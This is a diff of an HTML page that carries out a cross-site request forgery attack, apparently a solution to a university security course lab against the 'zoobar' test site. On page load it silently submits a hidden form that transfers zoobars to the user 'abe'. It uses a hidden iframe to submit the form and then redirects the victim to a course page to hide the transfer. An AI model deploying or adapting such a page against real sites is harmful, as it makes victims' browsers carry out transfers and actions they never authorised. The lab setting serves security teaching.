@@ -1,26 +1,33 @@
 <html>
 <head>
-<form name= "transfer_form" method="post" action = "http://zoobar.csl.toronto.edu/transfer.php">
-
-  <input type="text" name="zoobars" value="2">
-  <input type="text" name="zb_recipient" value="abe">
-  <input type="submit" name="submission" value="Send">
-
-</form>
 <script>
+var i=0;
 function submit_form() {
-  document.getElementById("transfer_form").submit();
+  if(window.location.search == "?x=1") {
+    document.getElementById("did").innerHTML = "";
+    document.getElementById("transfer_form").submit();
+  }
 }
 function redir() {
-  submit_form();
-  window.location = "http://ece568.csl.toronto.edu/";
+  i = i+1;
+  if (i == 2){
+    window.location = "http://ece568.csl.toronto.edu/";
+  }
 }
 </script>
 </head>
-<body>
-<iframe 
-  style="visibility:hidden" 
-  onLoad=redir()>
-</iframe>
+<body onLoad="submit_form()">
+<div id="did">
+  <iframe 
+    style="visibility:hidden" 
+    src="./b.html?x=1"
+    onLoad="redir()">
+  </iframe>
+</div>
+<form id= "transfer_form" method="post" action = "http://zoobar.csl.toronto.edu/transfer.php">
+  <input type="text" name="zoobars" value="2">
+  <input type="text" name="zb_recipient" value="abe">
+  <input type="submit" name="submission" value="Send">
+</form>
 </body>
 </html>
